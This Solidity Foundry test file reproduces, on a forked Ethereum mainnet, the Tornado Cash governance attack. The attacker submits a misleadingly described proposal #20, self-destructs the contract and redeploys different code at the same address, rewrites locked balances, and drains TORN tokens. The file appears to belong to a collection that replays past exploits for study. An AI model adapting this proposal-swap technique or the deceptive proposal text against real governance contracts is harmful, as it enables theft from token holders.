// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
import {IERC20} from "../../interfaces/IERC20.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";
import {Ownable} from "./AttackerOwnable.sol";
import "./TornadoGovernance.interface.sol";
import "./AttackerContracts.sol";

contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
    uint256 forkIdBefore;
    uint256 forkIdAfter;

    IERC20 tornToken = IERC20(0x77777FeDdddFfC19Ff86DB637967013e6C6A116C);
    ITornadoGovernance TORNADO_GOVERNANCE = ITornadoGovernance(0x5efda50f22d34F262c29268506C5Fa42cB56A1Ce);

    address ATTACKER1 = 0x092123663804f8801b9b086b03B98D706f77bD59;
    address ATTACKER2 = 0x592340957eBC9e4Afb0E9Af221d06fDDDF789de9;

    // Contracts used for the setup
    Attacker1Contract attacker1contract;
    ReinitializableContractFactory proposalFactory;
    TransientContract transientContract;
    Proposal_20 proposal_20;

    // Contracts used for the attack
    // The proposal factory used by the attacker
    address realProposalFactory = 0xAF54612427d97489707332efe0b6290F129DbAcb;
    address realTransient = 0x7dC86183274b28E9f1a100a0152DAc975361353d;
    address realProposal = 0xC503893b3e3c0C6b909222b45f2a3a259a52752D;
    address sampleMinion = 0xb4d47EE99E132e441Ae3467EB7D70F06d61b10C9;
    address realAttacker1Contract = 0x03eCF0d22f9cCd21144a7d492cf63b471916497A;

    function setUp() external {
        forkIdBefore = cheat.createSelectFork("mainnet", 17_248_593);
        forkIdAfter = cheat.createSelectFork("mainnet", 17_299_106);

        // The attacker used two accounts
        cheat.deal(ATTACKER1, 0.5 ether);
        cheat.deal(ATTACKER2, 10 ether); // https://etherscan.io/tx/0xf93536162943bd36df11de6ed11233589bb5f139ff4e9e425cb5256e4349a9b4

        //  This contract would play only the role of coordinating attacks
        cheat.deal(address(this), 0.5 ether);

        _labelAccounts();
        _tokenTrackerSetup();
    }

    function test_A_setup_attack() external {
        vm.selectFork(forkIdBefore);
        console2.log("Fork Block Number: %s", block.number);

        console2.log("\n======== STEP 0. DEPLOY FACTORY AND PROPOSAL - GET SOME TORN ========");
        // 0. Deploy a Factory with the transient and a "benign" proposal with the Attacker 2
        // https://explorer.phalcon.xyz/tx/eth/0x3e93ee75ffeb019f1d841b84695538571946fd9477dcd3ecf0790851f48fbd1a?line=0&debugLine=0
        vm.startPrank(ATTACKER2);
        _deployFactoryAndProposal();
        _swapEthForTorn();
        _initialTornLock();
        vm.stopPrank();

        console2.log("\n======== STEP 1. SUBMIT MALICIOUS PROPOSAL ========");
        // 1. Submit the proposal #20 allegating some relayers are cheating the protocol with the
        // Attacker 2
        // https://explorer.phalcon.xyz/tx/eth/0x34605f1d6463a48b818157f7b26d040f8dd329273702a0618e9e74fe350e6e0d?line=0&debugLine=0
        vm.rollFork(17_249_552);
        console2.log("Submitting proposal...");
        vm.startPrank(ATTACKER2);
        TORNADO_GOVERNANCE.propose(
            address(proposal_20),
            '{"title":"Proposal #20: Relayer registry penalization","description":"Penalize following relayers who is cheating the protocol.\nThe staked balances of these relayers are not burned at all, so the staking reward of valid participants are not properly paid.\n\n0xcBD78860218160F4b463612f30806807Fe6E804C tornadope.eth\n0x94596B6A626392F5D972D6CC4D929a42c2f0008c 0xgm777.eth\n0x065f2A0eF62878e8951af3c387E4ddC944f1B8F4 0xtorn365.eth\n0x18F516dD6D5F46b2875Fd822B994081274be2a8b abc321.eth\n\nUse same logic of proposal #16."}'
        );
        vm.stopPrank();

        console2.log("\n======== STEP 2. DEPLOY AND PREPARE MULTIPLE ACCOUNTS ========");
        // 2. Deploy multiple minion contracts with the Attacker Contract and lock zero TORN with
        // each
        // one in the Governance with the Attacker 2
        // https://explorer.phalcon.xyz/tx/eth/0x26672ad9140d11b64964e79d0ed5971c26492786cfe0edf57034229fdc7dc529?line=835&debugLine=835
        cheat.rollFork(17_285_354);
        vm.startPrank(ATTACKER1);
        attacker1contract = new Attacker1Contract();
        attacker1contract.deployMultipleContracts(5);
        vm.stopPrank();

        console2.log("\n======== STEP 3. DESTROY THE PROPOSAL AND TRANSIENT ========");
        // 3. Selfdestruct both the proposal and transient contract
        // https://explorer.phalcon.xyz/tx/eth/0xd3a570af795405e141988c48527a595434665089117473bc0389e83091391adb?line=0&debugLine=0

        vm.startPrank(ATTACKER2);
        proposalFactory.emergencyStop();
        vm.stopPrank();
    }

    function test_B_redeploy_and_drain() external {
        vm.selectFork(forkIdAfter);
        console2.log("Fork Block Number: %s", block.number); // just before the redeployment

        console2.log("\n======== STEP 4. REDEPLOY THE PROPOSAL AND TRANSIENT ========");
        // https://explorer.phalcon.xyz/tx/eth/0xa7d20ccdbc2365578a106093e82cc9f6ec5d03043bb6a00114c0ad5d03620122?line=2&debugLine=2
        console2.log("Before Redeployment Code Size");
        console2.log("Transient: %s", realTransient.code.length);
        console2.log("Proposal: %s", realProposal.code.length);

        vm.startPrank(ATTACKER2);
        _redeployTransientAndProposal();
        vm.stopPrank();

        console2.log("\nAfter Redeployment Code Size");
        console2.log("Transient: %s", realTransient.code.length);
        console2.log("Proposal: %s", realProposal.code.length);

        console2.log("\n======== STEP 5. EXECUTE MALICIOUS PROPOSAL ========");
        cheat.rollFork(17_299_138); // just before the execution
        console2.log("Executing malicious proposal...");
        // 5. Execute the malicious proposal in Tornado closing the position of 4 Relayers (the same
        // mentioned in the proposal #20 description)
        // https://explorer.phalcon.xyz/tx/eth/0x3274b6090685b842aca80b304a4dcee0f61ef8b6afee10b7c7533c32fb75486d?line=3&debugLine=3
        // This execution writes the lockedBalance mapping for the minion accounts previously deployed
        TORNADO_GOVERNANCE.execute(20);

        console2.log("\n======== STEP 6. DRAIN TORN FROM GOVERNANCE ========");
        console2.log("Draining TORN balance...");

        // 6. On each of the previously deployed minion, drain the governance by calling unlock() and
        // transfer() the TORN tokens to the Attacker 1, coordinated by the Attacker Contract
        // https://explorer.phalcon.xyz/tx/eth/0x13e2b7359dd1c13411342fd173750a19252f5b0d92af41be30f9f62167fc5b94?line=12&debugLine=12
        // The locked balance slots were wrote with 10,000e18 granting that amount of tokens per account
        // This call is made with a for loop over all the minions.
        // We will etch a minion impl with ours to show a potential implementation.
        cheat.rollFork(17_304_425); // just before the drain
        console2.log("Before Drain ");
        console2.log("Minion1 TORN Balance: %s", tornToken.balanceOf(sampleMinion));
        console2.log("Minion1 Locked Balance: %s", TORNADO_GOVERNANCE.lockedBalance(sampleMinion));
        console2.log("Attacker1 TORN Balance: %s", tornToken.balanceOf(ATTACKER1));

        // This part is coordinated by the Attacker1 minion factory, we will do this directly from here
        vm.startPrank(sampleMinion);
        TORNADO_GOVERNANCE.unlock(10_000 ether);
        tornToken.transfer(ATTACKER1, 10_000 ether);
        vm.stopPrank();

        console2.log("\nAfter Drain ");
        console2.log("Minion1 TORN Balance: %s", tornToken.balanceOf(sampleMinion));
        console2.log("Minion1 Locked Balance: %s", TORNADO_GOVERNANCE.lockedBalance(sampleMinion));
        console2.log("Attacker1 TORN Balance: %s", tornToken.balanceOf(ATTACKER1));
    }

    // ======== SETUP & PART I HELPERS ========
    function _swapEthForTorn() internal {
        // We emulate the swap with a token deal (getting 1017 TORN)
        // Swap 1 https://etherscan.io/tx/0x82dca5a88a43377cab4748073a3a46c8aa120d42c5c5d802789cf17df22f0acd
        // Swap 2 https://etherscan.io/tx/0x6d3445d633de3d9c9dfdd4ca75cab9ff2cd269ec6d124baf2cd11cd177d04850
        deal(address(tornToken), ATTACKER2, 1017 ether);
        assertEq(tornToken.balanceOf(ATTACKER2), 1017 ether, "torn token balance mismatch");
    }

    function _initialTornLock() internal {
        // The attacker first approves with type(uint256).max
        tornToken.approve(address(TORNADO_GOVERNANCE), type(uint256).max);

        // Then locks with approval
        TORNADO_GOVERNANCE.lockWithApproval(tornToken.balanceOf(ATTACKER2));
    }

    function _deployFactoryAndProposal() internal {
        // Deploy the factory
        proposalFactory = new ReinitializableContractFactory();
        console2.log("Proposal Factory deployed at: %s", address(proposalFactory));

        // Deploy the proposal through a transient deploying the benign proposal
        (address proposal, address transient) =
            proposalFactory.createProposalWithTransient(bytes32(bytes20(ATTACKER2)), false);

        proposal_20 = Proposal_20(proposal);
        transientContract = TransientContract(transient);

        // Check the transient contract with a read method:
        address preCalcTransientContract =
            proposalFactory.getTransientContractAddress(bytes32(bytes20(ATTACKER2)));

        assertEq(preCalcTransientContract, address(transientContract), "Wrong address of transient contract");
        assertEq(transientContract.owner(), address(proposalFactory), "Wrong owner in transient contract");

        console2.log("Transient deployed at: %s", address(transientContract));
        console2.log("Proposal 20 deployed at: %s", address(proposal_20));
    }

    // ======== REDEPLOY & PART II HELPERS ========
    function _redeployTransientAndProposal() internal {
        // This is how a redeployment could look like
        // // Deploy the malicious proposal through a transient
        // (address proposal, address transient) =
        //     proposalFactory.createProposalWithTransient(bytes32(bytes20(ATTACKER2)), true);

        // proposal_20 = Proposal_20(proposal);
        // transientContract = TransientContract(transient);

        // // Check the transient contract with a read method:
        // address preCalcTransientContract =
        //     proposalFactory.getTransientContractAddress(bytes32(bytes20(ATTACKER2)));

        // assertEq(preCalcTransientContract, address(transientContract), "Wrong address of transient
        // contract");
        // assertEq(transientContract.owner(), address(proposalFactory), "Wrong owner in transient contract");

        // console2.log("Transient deployed at: %s", address(transientContract));
        // console2.log("Proposal 20 deployed at: %s", address(proposal_20));

        // We call the actual attacker's contract showing the redeployment
        bytes32 redeployTx = 0xa7d20ccdbc2365578a106093e82cc9f6ec5d03043bb6a00114c0ad5d03620122;
        vm.transact(redeployTx);
    }

    function _labelAccounts() internal {
        cheat.label(address(tornToken), "TORN");

        cheat.label(address(this), "TEST CONTRACT");
    }

    function _tokenTrackerSetup() internal {
        addTokenToTracker(address(tornToken));

        updateBalanceTracker(address(this));
        updateBalanceTracker(ATTACKER1);
        updateBalanceTracker(ATTACKER2);
    }
}
